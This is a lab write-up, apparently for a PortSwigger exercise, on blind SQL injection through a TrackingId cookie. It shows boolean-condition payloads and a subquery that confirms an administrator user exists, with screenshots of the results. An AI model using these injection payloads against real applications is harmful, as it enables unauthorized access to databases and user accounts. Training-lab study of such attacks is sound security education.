## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/a2277a84-8741-4b90-b15e-d88ad9c9eda9)


## Solution :

Query made - 

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '<COOKIE-VALUE>'
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6f499d35-6e1f-418e-8a34-f8b18889ea14)

*This how the session looks like where ```TrackingId and COOKIE-VALUE``` are shown and  Welcome back message is also displyed.*


TrackingID parameter is vulnerable. So it is vulnerablecan to blind SQL injection on trackingID parameter.

```If the Condition is true it will display the Welcome back message```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=1-- '
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/fe425f15-d397-46a0-a068-7bcbdc6b4de8)

```If the Condition is not true it will not  display the Welcome back message```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND 1=2-- '
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/8490db5d-55ae-4aaa-8924-0aee2f53704e)

#### Check Whether the username administrator is present in users table -

```Here table name is users```

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>' AND (SELECT 'Ananthan' FROM users WHERE username='administrator')='Ananthan
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/88dbcb08-b121-47a8-8b20-cad203b083d4)

It display the Welcome back message. So username administrator  is present in the user table.
